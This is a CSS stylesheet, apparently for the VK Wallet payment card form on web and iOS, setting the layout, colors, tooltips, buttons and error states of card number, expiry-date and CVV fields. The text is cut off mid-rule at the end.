.pay-card_type_vk-wallet .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	width: 100%
}

.pay-card_type_vk-wallet .credit-card-form__label-group_type_expiration-date .credit-card-form__input {
	margin: 0;
	width: 100%
}

.pay-card_type_vk-wallet .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv {
	position: relative;
	padding: 0 0 0 10px
}

.pay-card_type_vk-wallet .credit-card-form__label-group_type_one-column .credit-card-form__label_type_cvv {
	padding-left: 0
}

.pay-card_type_vk-wallet .credit-card-form__cvv-icon,
.pay-card_type_vk-wallet .credit-card-form__cvv-icon:hover,
.pay-card_type_vk-wallet .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon {
	top: 37px;
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none;
	position: absolute;
	left: auto;
	right: 10px;
	text-align: center;
	color: #528bcc;
	cursor: pointer
}

.pay-card_type_vk-wallet .credit-card-form__label_error_yes .credit-card-form__cvv-icon {
	display: block
}

.pay-card_type_vk-wallet .credit-card-form__label_type_cvv .credit-card-form__title {
	position: relative
}

.pay-card_type_vk-wallet .credit-card-form__label_type_cvv .credit-card-form__input,
.pay-card_type_vk-wallet .credit-card-form__label_type_cvv .credit-card-form__title {
	width: 100%
}

.pay-card_type_vk-wallet .credit-card-form__error-text {
	position: static;
	font-size: 14px;
	color: #e64646
}

.pay-card_type_vk-wallet .credit-card-form_single-side_yes .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none;
	width: auto
}

.pay-card_type_vk-wallet .credit-card-form_single-side_yes .credit-card-form__label_type_cvv.credit-card-form__label_error_yes .credit-card-form__error-text {
	display: block
}

.pay-card_type_vk-wallet .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	background-color: #faeaea;
	border: 1px solid #e64646
}

.pay-card_type_vk-wallet .credit-card-form__popup {
	margin: 0 auto
}

.pay-card_type_vk-wallet .credit-card-form__popup .button,
.pay-card_type_vk-wallet .credit-card-form__submit .button {
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	padding: 0;
	text-transform: none;
	font-weight: 500;
	margin: 0
}

.pay-card_type_vk-wallet .credit-card-form__submit .button {
	color: #fff;
	border-radius: 6px;
	width: 100%;
	height: 44px;
	line-height: 44px;
	font-size: 16px;
	letter-spacing: -.02em;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_vk-wallet .credit-card-form__submit .button,
.pay-card_type_vk-wallet .credit-card-form__submit .button:active,
.pay-card_type_vk-wallet .credit-card-form__submit .button:hover {
	background: #5181b8
}

.pay-card_type_vk-wallet .credit-card-form__submit .button:focus {
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_vk-wallet .credit-card-form__submit .button.button_disabled_yes {
	border-radius: 6px
}

.pay-card_type_vk-wallet .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_vk-wallet .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_vk-wallet .credit-card-form__submit .button.button_disabled_yes:hover {
	background: rgba(81, 129, 184, .4);
	color: #fff;
	cursor: default
}

.pay-card_type_vk-wallet .credit-card-form__popup .button {
	border-radius: 2px;
	font-size: 14px;
	height: 30px;
	line-height: 30px;
	width: 175px
}

.pay-card_type_vk-wallet .credit-card-form__popup .button,
.pay-card_type_vk-wallet .credit-card-form__popup .button:hover {
	background: #e5ebf0;
	color: #45678f
}

.pay-card_type_vk-wallet .credit-card-form__popup .button:active {
	background: #cbd7e2
}

.pay-card_type_vk-wallet .credit-card-form__popup .button.button_disabled_yes {
	border-radius: 2px
}

.pay-card_type_vk-wallet .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_vk-wallet .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card_type_vk-wallet .credit-card-form__popup .button.button_disabled_yes:hover {
	background: rgba(0, 57, 115, .05);
	color: #45678f;
	cursor: default
}

.pay-card_type_vk-wallet .credit-card-form__popup .info-block .paragraph_color_red {
	color: #71757a
}

.pay-card_type_vk-wallet .notification-block__inner {
	padding: 0
}

.pay-card_type_vk-wallet .credit-card-form__popup-footer {
	height: auto;
	padding: 0 12px
}

.pay-card_type_vk-wallet .pay-card__row .pay-card__card .credit-card-form .credit-card-form__form {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	-webkit-box-direction: normal;
	-webkit-flex-direction: column;
	flex-direction: column;
	-webkit-box-pack: justify;
	-webkit-justify-content: space-between;
	justify-content: space-between
}

.pay-card_type_vk-wallet .pay-card__card {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-flex: 1;
	-webkit-flex: 1 1 auto;
	flex: 1 1 auto
}

.pay-card_type_vk-wallet .pay-card__row {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	-webkit-box-direction: normal;
	-webkit-flex-direction: column;
	flex-direction: column
}

.pay-card_type_vk-wallet .credit-card-form__tooltip {
	width: 189px;
	height: 39px;
	top: -14px;
	left: auto;
	right: 0;
	font-size: 12px;
	line-height: 14px;
	padding: 5px 8px;
	white-space: normal;
	border: none;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background-color: rgba(0, 0, 0, .7);
	border-radius: 6px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	text-align: left;
	color: #fff;
	font-family: Arial, Tahoma, Verdana, sans-serif;
	letter-spacing: -.02em
}

.pay-card_type_vk-wallet .credit-card-form__label-group_type_one-column .credit-card-form__tooltip {
	right: 0
}

.pay-card_type_vk-wallet .credit-card-form__tooltip-arrow {
	bottom: -16px;
	right: 17px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-top-color: rgba(0, 0, 0, .7);
	border-width: 5px;
	margin-left: 0
}

.pay-card_type_vk-wallet .credit-card-form__label-group_type_one-column .credit-card-form__tooltip-arrow {
	left: 163px
}

.pay-card_type_vk-wallet .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-close {
	cursor: pointer;
	top: 16px;
	right: 15px;
	position: absolute
}

.pay-card_type_vk-wallet .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon {
	display: none
}

.pay-card_type_vk-wallet .credit-card-form__popup-body {
	height: auto
}

.pay-card_type_vk-wallet .credit-card-form__popup {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	-webkit-box-direction: normal;
	-webkit-flex-direction: column;
	flex-direction: column;
	-webkit-box-pack: center;
	-webkit-justify-content: center;
	justify-content: center
}

.pay-card_type_vk-wallet .pay-card__row .pay-card__card {
	margin: 0
}

.pay-card_type_vk-wallet .pay-card__row .pay-card__card .credit-card-form {
	width: 100%
}

.pay-card_type_vk-wallet .pay-card__row .pay-card__select-card .control-label {
	display: block
}

.pay-card_type_vk-wallet .control-label__text,
.pay-card_type_vk-wallet .credit-card-form__label,
.pay-card_type_vk-wallet .credit-card-form__title {
	text-transform: none;
	font-size: 14px;
	color: #71757a;
	text-align: left;
	letter-spacing: -.01em;
	line-height: 18px
}

.pay-card_type_vk-wallet .credit-card-form__input,
.pay-card_type_vk-wallet .pay-card__select-card .control__select,
.pay-card_type_vk-wallet .pay-card__select-card .control__select.pay-card__select-card_type_added-card {
	background-color: #fff
}

.pay-card_type_vk-wallet .payment-systems-icons {
	position: absolute;
	top: 36px;
	right: 12px
}

.pay-card_type_vk-wallet .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_vk-wallet .payment-systems-icons .payment-systems-icon_name_visa {
	top: 0
}

.pay-card_type_vk-wallet .pay-card__select-card .payment-systems-icons {
	padding-left: 15px;
	width: 85%;
	top: 36px;
	right: 0;
	left: 1px;
	pointer-events: none;
	font-size: 0;
	height: 24px;
	line-height: 24px;
	background-color: #fff;
	border-radius: 6px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-pack: start;
	-webkit-justify-content: start;
	justify-content: start;
	-webkit-box-orient: horizontal;
	-webkit-box-direction: normal;
	-webkit-flex-flow: row nowrap;
	flex-flow: row nowrap;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center
}

.pay-card_type_vk-wallet .payment-systems-icon__text-inner {
	color: #e64646
}

.pay-card_type_vk-wallet .credit-card-form__submit {
	margin: 0;
	padding-top: 8px;
	width: 100%;
	position: relative;
	left: 0;
	bottom: 0
}

.pay-card_type_vk-wallet .pay-card__select-card .control__select.pay-card__select-card_type_added-card {
	color: #f2f3f5;
	padding-left: 12px
}

.pay-card_type_vk-wallet .pay-card__select-card .control__select.pay-card__select-card_type_added-card option {
	color: #000
}

.pay-card_type_vk-wallet .credit-card-form__input:focus {
	border: 1px solid #528bcc
}

.pay-card_type_vk-wallet .credit-card-form__label_error_yes .credit-card-form__input:focus {
	border: 1px solid #e64646
}

.pay-card_type_vk-wallet .pay-card__row .credit-card-form__error-text {
	line-height: 18px;
	margin-top: 8px
}

.pay-card_type_vk-wallet .credit-card-form__label-group_type_card-number {
	margin: 0 0 20px;
	padding: 0
}

.pay-card_type_vk-wallet .credit-card-form__popup .info-block .title {
	color: #71757a;
	font-size: 14px;
	margin: 0
}

.pay-card_type_vk-wallet .credit-card-form__popup .info-block .paragraph {
	font-size: 14px;
	margin: 0 0 16px
}

.pay-card_type_vk-wallet .pay-card__message {
	font-size: 12px;
	text-align: left;
	color: #656556;
	line-height: 17px;
	margin-bottom: 20px
}

.extended-select-box .selectBox-dropdown-menu {
	top: 70px!important;
	border-radius: 0 0 6px 6px;
	border: 1px solid #dcdee0;
	border-top: 0;
	-webkit-box-shadow: none;
	box-shadow: none;
	height: auto;
	max-height: 169px
}

.extended-select-box .selectBox-dropdown-menu .selectBox-option.selectBox-selected:after {
	margin-top: 6px;
	background-repeat: no-repeat;
	content: "";
	position: absolute;
	right: 15px
}

.extended-select-box .selectBox-dropdown-menu .selectBox-option .selectBox-icon_wrapper,
.extended-select-box .selectBox-dropdown-menu .selectBox-option .selectBox-text {
	line-height: 36px
}

.extended-select-box .selectBox-dropdown-menu .selectBox-option .payment-systems-icon {
	display: inline-block;
	vertical-align: middle
}

.extended-select-box .selectBox.control__select.js-card-selector.selectBox-dropdown.selectBox-menuShowing.selectBox-menuShowing-bottom {
	border-radius: 6px 6px 0 0;
	border: 1px solid #528bcc;
	background-color: #fff
}

.extended-select-box .selectBox-icon_wrapper .payment-systems-icon {
	margin: 0 15px
}

.extended-select-box .selectBox-option .payment-systems-icon,
.extended-select-box .selectBox-option .selectBox-icon_wrapper,
.extended-select-box .selectBox-option .selectBox-text {
	display: block
}

.extended-select-box .selectBox .selectBox-option .selectBox-icon_wrapper {
	width: 74px;
	display: none;
	-webkit-box-pack: center;
	-webkit-justify-content: center;
	justify-content: center
}

.extended-select-box .pay-card__card_type_added-card .selectBox .selectBox-option .selectBox-icon_wrapper,
.extended-select-box .selectBox-option {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.extended-select-box .selectBox-option {
	height: 36px;
	line-height: 16px
}

.extended-select-box .selectBox-option .selectBox-text {
	text-align: left;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	font-size: 16px;
	width: 80%
}

.extended-select-box .selectBox-arrow,
.extended-select-box .selectBox-label {
	display: none!important
}

.extended-select-box .selectBox-options li a {
	padding: 0
}

.extended-select-box .selectBox-options li.selectBox-hover a,
.extended-select-box .selectBox-options li.selectBox-selected a {
	background-color: transparent
}

.extended-select-box .selectBox-input_wrapper .selectBox-text,
.pay-card__card_type_added-card .extended-select-box .selectBox-input_wrapper {
	display: none
}

.secure-information_type_vk-wallet.secure-information {
	background: none;
	padding-top: 15px
}

.secure-information_type_vk-wallet .secure-information__text {
	font-family: -apple-system, BlinkMacSystemFont, Roboto, Open Sans, Helvetica Neue, sans-serif;
	font-size: 13px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: horizontal;
	-webkit-box-direction: normal;
	-webkit-flex-direction: row;
	flex-direction: row;
	-webkit-box-pack: start;
	-webkit-justify-content: flex-start;
	justify-content: flex-start
}

.secure-information_type_vk-wallet .secure-information__text_type_secure-connection {
	color: #656565;
	font-size: 12px;
	line-height: 17px
}

.secure-information_type_vk-wallet .secure-information__icon {
	display: block;
	margin: 1px 10px 0 0;
	-webkit-box-flex: 0;
	-webkit-flex: 0 0 12px;
	flex: 0 0 12px
}

.pay-card_type_vk-wallet.pay-card_type_submit-button-hidden .credit-card-form__submit {
	display: none
}

.pay-card_type_vk-wallet.pay-card_type_submit-button-hidden .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	margin-bottom: 0
}

.selectBox__dropdown_element_type_date {
	color: #909499;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_vk-wallet-ios {
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none;
	margin: 0 auto;
	padding: 0 12px 15px;
	position: relative;
	width: 100%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	font-size: 16px;
	color: #000;
	-webkit-font-smoothing: antialiased;
	height: 100%;
	min-width: 320px
}

.pay-card_type_vk-wallet-ios~.credit-card-form__popup .credit-card-form__popup-body {
	height: 100%
}

.pay-card_type_vk-wallet-ios .pay-card__row {
	padding: 0
}

.pay-card_type_vk-wallet-ios .pay-card__card-selector {
	position: relative;
	width: auto;
	margin: 0 0 26px
}

.pay-card_type_vk-wallet-ios .pay-card__card-selector.pay-card__card-selector_type_hidden {
	display: none!important
}

.pay-card_type_vk-wallet-ios .pay-card__select-card {
	display: block
}

.pay-card_type_vk-wallet-ios .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_vk-wallet-ios .pay-card__select-card .control__select {
	-webkit-tap-highlight-color: transparent;
	width: 100%;
	height: 44px;
	padding: 12px;
	margin: 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 10px;
	background: #fff;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	font-size: 16px;
	color: #000;
	border-color: #d7d8d9;
	letter-spacing: -.02em;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_vk-wallet-ios .pay-card__select-card .control-label {
	width: 100%;
	position: relative
}

.pay-card_type_vk-wallet-ios .pay-card__select-card .control-label:after {
	position: absolute;
	top: 44px;
	content: "";
	right: 13px;
	pointer-events: none
}

.pay-card_type_vk-wallet-ios .pay-card__select-card-payment-systems-icons .payment-systems-icon {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.pay-card_type_vk-wallet-ios .pay-card__select-card .payment-systems-icons {
	padding-left: 12px;
	top: 26px;
	right: 0;
	left: 1px;
	pointer-events: none;
	width: 85%;
	height: 42px;
	line-height: 42px;
	background-color: transparent;
	border-radius: 6px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-pack: start;
	-webkit-justify-content: start;
	justify-content: start;
	-webkit-box-orient: horizontal;
	-webkit-box-direction: normal;
	-webkit-flex-flow: row nowrap;
	flex-flow: row nowrap;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center
}

.pay-card_type_vk-wallet-ios .payment-systems-icons {
	position: absolute;
	top: 36px;
	right: 12px
}

.pay-card_type_vk-wallet-ios .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_vk-wallet-ios .payment-systems-icons .payment-systems-icon_name_visa {
	top: 0
}

.pay-card_type_vk-wallet-ios .payment-systems-icon__text {
	padding-left: 12px;
	letter-spacing: -.4px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center;
	overflow: hidden
}

.pay-card_type_vk-wallet-ios .payment-systems-icon__element {
	display: inline-block
}

.pay-card_type_vk-wallet-ios .payment-systems-icon__element_type_bullets {
	padding-bottom: 3px
}

.pay-card_type_vk-wallet-ios .payment-systems-icon__element_type_number {
	margin-left: .25em
}

.pay-card_type_vk-wallet-ios .payment-systems-icon__element_type_date {
	color: #909499;
	padding-left: 8px
}

.pay-card_type_vk-wallet-ios .payment-systems-icon__element_type_text-inner {
	color: #e64646;
	padding-left: 8px
}

.pay-card_type_vk-wallet-ios .pay-card__card {
	width: auto
}

.pay-card_type_vk-wallet-ios .pay-card__card_type_added-card .credit-card-form__label-group_type_card-number,
.pay-card_type_vk-wallet-ios .pay-card__card_type_added-card .payment-systems-icons,
.pay-card_type_vk-wallet-ios .payment-systems-icon.payment-systems-icon_disabled_yes {
	display: none
}

.pay-card_type_vk-wallet-ios .credit-card-form__card-wrapper {
	position: relative
}

.pay-card_type_vk-wallet-ios .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card_type_vk-wallet-ios .credit-card-form__submit {
	position: absolute;
	bottom: 12px;
	left: 12px;
	width: -webkit-calc(100% - 24px);
	width: calc(100% - 24px)
}

.pay-card_type_vk-wallet-ios .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: auto;
	height: auto;
	margin: 0 auto;
	padding: 0;
	background: none;
	border-radius: 0;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_card-number {
	margin: 0 0 12px
}

.pay-card_type_vk-wallet-ios .control-label__text,
.pay-card_type_vk-wallet-ios .credit-card-form__title {
	display: block;
	margin: 0 0 7px;
	text-transform: none;
	color: #71757a;
	font-size: 14px;
	letter-spacing: -.02em
}

.pay-card_type_vk-wallet-ios .credit-card-form__input {
	-webkit-tap-highlight-color: transparent;
	height: 44px;
	background: #fff;
	border-color: #d7d8d9;
	color: #000;
	border-radius: 10px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 16px;
	padding-left: 12px;
	letter-spacing: -.02em;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_vk-wallet-ios .credit-card-form__input::-webkit-input-placeholder {
	color: #aaaeb3;
	text-transform: none;
	letter-spacing: -.02em;
	font-size: 16px
}

.pay-card_type_vk-wallet-ios .credit-card-form__input::-moz-placeholder {
	color: #aaaeb3;
	text-transform: none;
	letter-spacing: -.02em;
	font-size: 16px
}

.pay-card_type_vk-wallet-ios .credit-card-form__input::placeholder {
	color: #aaaeb3;
	text-transform: none;
	letter-spacing: -.02em;
	font-size: 16px
}

.chrome .pay-card_type_vk-wallet-ios .credit-card-form__input_type_protected::-webkit-input-placeholder {
	-webkit-transform: translateY(-3px);
	transform: translateY(-3px)
}

.chrome .pay-card_type_vk-wallet-ios .credit-card-form__input_type_protected::-moz-placeholder {
	transform: translateY(-3px)
}

.chrome .pay-card_type_vk-wallet-ios .credit-card-form__input_type_protected::placeholder {
	-webkit-transform: translateY(-3px);
	-o-transform: translateY(-3px);
	transform: translateY(-3px)
}

.pay-card_type_vk-wallet-ios .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_vk-wallet-ios .credit-card-form__input:disabled {
	color: #71757a;
	opacity: 1
}

.pay-card_type_vk-wallet-ios .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_expiration-date {
	margin: 0;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	float: none;
	margin-bottom: 26px;
	width: 50%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding-right: 6px
}

@media (min-device-width:375px) and (max-device-width:667px) and (orientation:portrait) and (-webkit-min-device-pixel-ratio:2) {
	.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
		width: auto!important
	}
}

.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	width: 100%
}

.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_expiration-date .credit-card-form__input {
	margin: 0;
	width: 100%
}

@media (min-device-width:375px) and (max-device-width:414px) and (orientation:portrait) and (-webkit-min-device-pixel-ratio:2) {
	.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_expiration-date .credit-card-form__input {
		width: 170px!important
	}
}

@media (min-device-width:414px) and (max-device-width:667px) and (orientation:portrait) and (-webkit-min-device-pixel-ratio:2) {
	.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_expiration-date .credit-card-form__input {
		width: 189px!important
	}
}

.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv {
	-webkit-tap-highlight-color: transparent;
	position: relative;
	padding: 0 0 0 5px
}

.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_one-column .credit-card-form__label_type_cvv {
	padding-left: 0
}

.pay-card_type_vk-wallet-ios .credit-card-form__cvv-icon,
.pay-card_type_vk-wallet-ios .credit-card-form__cvv-icon:hover,
.pay-card_type_vk-wallet-ios .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon {
	border: 7px solid #f2f3f5;
	border-radius: 10px;
	top: 28px;
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none;
	position: absolute;
	left: auto;
	right: 3px;
	text-align: center;
	cursor: pointer
}

.pay-card_type_vk-wallet-ios .credit-card-form__cvv-icon:focus,
.pay-card_type_vk-wallet-ios .credit-card-form__cvv-icon:hover:focus,
.pay-card_type_vk-wallet-ios .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon:focus {
	outline: none
}

.pay-card_type_vk-wallet-ios .credit-card-form__label_error_yes .credit-card-form__cvv-icon,
.pay-card_type_vk-wallet-ios .credit-card-form__label_error_yes .credit-card-form__cvv-icon:hover,
.pay-card_type_vk-wallet-ios .credit-card-form__label_error_yes.credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon {
	display: block;
	border-color: #faeaea
}

.pay-card_type_vk-wallet-ios .credit-card-form__label_type_cvv .credit-card-form__title {
	position: relative
}

.pay-card_type_vk-wallet-ios .credit-card-form__label_type_cvv .credit-card-form__input,
.pay-card_type_vk-wallet-ios .credit-card-form__label_type_cvv .credit-card-form__title {
	width: 100%
}

.pay-card_type_vk-wallet-ios .credit-card-form__error-text {
	position: static;
	font-size: 14px;
	color: #e64646
}

.pay-card_type_vk-wallet-ios .credit-card-form_single-side_yes .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none;
	width: auto
}

.pay-card_type_vk-wallet-ios .credit-card-form_single-side_yes .credit-card-form__label_type_cvv.credit-card-form__label_error_yes .credit-card-form__error-text {
	display: block
}

.pay-card_type_vk-wallet-ios .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	background-color: #faeaea;
	border: 1px solid #e64646
}

.pay-card_type_vk-wallet-ios .credit-card-form__popup {
	margin: 0 auto
}

.pay-card_type_vk-wallet-ios .credit-card-form__popup .button,
.pay-card_type_vk-wallet-ios .credit-card-form__submit .button {
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	padding: 0;
	text-transform: none;
	font-weight: 500;
	margin: 0
}

.pay-card_type_vk-wallet-ios .credit-card-form__submit .button {
	-webkit-tap-highlight-color: transparent;
	color: #fff;
	border-radius: 10px;
	width: 100%;
	height: 44px;
	line-height: 44px;
	font-size: 16px;
	letter-spacing: -.02em;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_vk-wallet-ios .credit-card-form__submit .button,
.pay-card_type_vk-wallet-ios .credit-card-form__submit .button:active,
.pay-card_type_vk-wallet-ios .credit-card-form__submit .button:hover {
	background: #5181b8
}

.pay-card_type_vk-wallet-ios .credit-card-form__submit .button:focus {
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_vk-wallet-ios .credit-card-form__submit .button.button_disabled_yes {
	-webkit-tap-highlight-color: transparent;
	border-radius: 10px
}

.pay-card_type_vk-wallet-ios .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_vk-wallet-ios .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_vk-wallet-ios .credit-card-form__submit .button.button_disabled_yes:hover {
	background: rgba(81, 129, 184, .4);
	color: #fff;
	cursor: default
}

.pay-card_type_vk-wallet-ios .credit-card-form__popup .button {
	-webkit-tap-highlight-color: transparent;
	border-radius: 15px;
	font-size: 14px;
	height: 30px;
	line-height: 30px;
	width: 175px
}

.pay-card_type_vk-wallet-ios .credit-card-form__popup .button,
.pay-card_type_vk-wallet-ios .credit-card-form__popup .button:hover {
	background: #e5ebf0;
	color: #45678f
}

.pay-card_type_vk-wallet-ios .credit-card-form__popup .button:active {
	background: #cbd7e2
}

.pay-card_type_vk-wallet-ios .credit-card-form__popup .button.button_disabled_yes {
	-webkit-tap-highlight-color: transparent;
	border-radius: 15px
}

.pay-card_type_vk-wallet-ios .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_vk-wallet-ios .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card_type_vk-wallet-ios .credit-card-form__popup .button.button_disabled_yes:hover {
	background: rgba(0, 57, 115, .05);
	color: #45678f;
	cursor: default
}

.pay-card_type_vk-wallet-ios .credit-card-form__popup .info-block .paragraph_color_red {
	color: #71757a
}

.pay-card_type_vk-wallet-ios .notification-block__inner {
	padding: 0
}

.pay-card_type_vk-wallet-ios .credit-card-form__popup-footer {
	height: auto
}

.pay-card_type_vk-wallet-ios .pay-card__row .pay-card__card .credit-card-form .credit-card-form__form {
	-webkit-tap-highlight-color: transparent;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	-webkit-box-direction: normal;
	-webkit-flex-direction: column;
	flex-direction: column;
	-webkit-box-pack: justify;
	-webkit-justify-content: space-between;
	justify-content: space-between
}

.pay-card_type_vk-wallet-ios .pay-card__card {
	-webkit-tap-highlight-color: transparent;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-flex: 1;
	-webkit-flex: 1 1 auto;
	flex: 1 1 auto
}

.pay-card_type_vk-wallet-ios .pay-card__row {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	-webkit-box-direction: normal;
	-webkit-flex-direction: column;
	flex-direction: column
}

.pay-card_type_vk-wallet-ios .credit-card-form__tooltip {
	height: 53px;
	top: -28px;
	width: auto;
	width: 204px;
	line-height: 18px;
	white-space: normal;
	border: none;
	left: auto;
	right: 0;
	padding: 9px 16px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background-color: #fff;
	-webkit-box-shadow: 2px 3px 18px 11px rgba(0, 0, 0, .05), 0 2px 2px 0 rgba(0, 0, 0, .1), 0 3px 1px 0 rgba(0, 0, 0, .05);
	box-shadow: 2px 3px 18px 11px rgba(0, 0, 0, .05), 0 2px 2px 0 rgba(0, 0, 0, .1), 0 3px 1px 0 rgba(0, 0, 0, .05);
	border-radius: 10px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 14px;
	font-family: Arial, Tahoma, Verdana, sans-serif;
	text-align: left;
	color: #2c2d2e;
	letter-spacing: -.02em
}

.pay-card_type_vk-wallet-ios .credit-card-form__tooltip .credit-card-form__tooltip-arrow {
	top: 100%;
	bottom: -16px;
	right: 14px;
	border: solid transparent;
	height: 0;
	width: 0;
	pointer-events: none;
	border-top-color: #fff;
	border-width: 8px;
	margin-left: 0
}

.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_one-column .credit-card-form__tooltip {
	left: 0
}

@media (min-width:380px) {
	.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_one-column .credit-card-form__tooltip {
		right: 0;
		left: auto
	}
}

.pay-card_type_vk-wallet-ios .credit-card-form__tooltip-arrow {
	bottom: -16px;
	right: 14px;
	border: solid transparent;
	height: 0;
	width: 0;
	pointer-events: none;
	border-top-color: #5181b8;
	border-width: 8px;
	margin-left: 0
}

.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_one-column .credit-card-form__tooltip {
	right: -webkit-calc(-204px + 100%);
	right: calc(-204px + 100%)
}

@media (min-width:467px) {
	.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_one-column .credit-card-form__tooltip {
		right: 0
	}
}

.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_one-column .credit-card-form__tooltip-arrow {
	left: -webkit-calc(50vw - 42px);
	left: calc(50vw - 42px)
}

@media (max-width:320px) {
	.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_one-column .credit-card-form__tooltip-arrow {
		left: 118px
	}
}

@media (min-width:380px) {
	.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_one-column .credit-card-form__tooltip-arrow {
		right: 14px;
		left: auto
	}
}

.pay-card_type_vk-wallet-ios .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon {
	display: none
}

.pay-card_type_vk-wallet-ios .credit-card-form__popup-body {
	height: auto
}

.pay-card_type_vk-wallet-ios .credit-card-form__popup {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	-webkit-box-direction: normal;
	-webkit-flex-direction: column;
	flex-direction: column;
	-webkit-box-pack: center;
	-webkit-justify-content: center;
	justify-content: center
}

.pay-card_type_vk-wallet-ios .pay-card__row .pay-card__card {
	margin: 0
}

.pay-card_type_vk-wallet-ios .pay-card__row .pay-card__card .credit-card-form {
	-webkit-tap-highlight-color: transparent;
	width: 100%
